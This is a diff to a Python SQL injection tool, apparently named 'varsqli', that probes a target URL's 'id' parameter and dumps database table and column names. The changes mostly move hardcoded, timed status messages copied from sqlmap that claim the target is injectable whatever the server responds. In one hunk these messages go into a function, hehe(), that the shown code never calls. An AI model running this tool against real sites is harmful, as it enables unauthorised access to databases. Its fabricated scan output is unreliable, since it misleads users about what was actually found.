@@ -1,5 +1,6 @@
 # V2.1.15 - Pro 
 # Cyber Security
+# Anonymous VNPC
 import requests
 import argparse
 import re
@@ -231,6 +232,16 @@ if args.url:
     print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable")
     time.sleep(1)
     print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " testing 'MySQL inline queries'")
+    time.sleep(3)
+    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " testing 'Generic UNION query (NULL) - 1 to 20 columns'")
+    time.sleep(4)
+    print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found")
+    time.sleep(1)
+    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test")
+    time.sleep(1)
+    print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " target URL appears to have 11 columns in query")
+    time.sleep(1)
+    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable")
     time.sleep(1)
     check_vuln = "%27"
     checks = requests.get(url + check_vuln)
@@ -248,15 +259,7 @@ if args.url:
                     if check_conn.status_code == 200:
                         pass
                         exploits = requests.get(url + payload)
-                        print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " testing 'Generic UNION query (NULL) - 1 to 20 columns'")
-                        time.sleep(4)
-                        print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found")
-                        time.sleep(1)
-                        print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test")
-                        time.sleep(1)
-                        print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " target URL appears to have 11 columns in query")
-                        time.sleep(1)
-                        print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable")
+                        
                         if "The used SELECT" in exploits.text:
                             pass
                         else:
@@ -419,14 +422,12 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                                 columns_name = column_dump.replace("::", "")
                                                 print("[INFO] fetching database tables on columns name : {}".format(columns_name))
                                                 time.sleep(0.30)
-                                                print()
                                             print("+-----------------------------+")
                                             num_tab = 0
                                             for dump in find_all:
                                                 num_tab += 1
                                                 tables_name = dump.replace("::", " ")
                                                 print("|", tables_name)
-                                                time.sleep(0.30)
                                             print("+----------------------------+")
                                             print("Find {} Columns".format(num_tab))
                                             print("")
@@ -448,16 +449,18 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                     check_conn = requests.get(url + payload)
                     if check_conn.status_code == 200:
                         pass
+                        def hehe():
+                            print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " testing 'Generic UNION query (NULL) - 1 to 20 columns'")
+                            time.sleep(4)
+                            print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found")
+                            time.sleep(1)
+                            print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test")
+                            time.sleep(1)
+                            print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " target URL appears to have 11 columns in query")
+                            time.sleep(1)
+                            print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable")                        
+                        
                         exploits = requests.get(url + payload)
-                        print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " testing 'Generic UNION query (NULL) - 1 to 20 columns'")
-                        time.sleep(4)
-                        print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found")
-                        time.sleep(1)
-                        print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test")
-                        time.sleep(1)
-                        print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " target URL appears to have 11 columns in query")
-                        time.sleep(1)
-                        print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable")                        
                         if "The used SELECT" in exploits.text:
                             pass
                         else:
@@ -625,7 +628,6 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                                 num_tab += 1
                                                 tables_name = dump.replace("::", " ")
                                                 print("|", tables_name)
-                                                time.sleep(0.30)
                                             print("+----------------------------+")
                                             print("Find {} Columns".format(num_tab))
                                             print("")
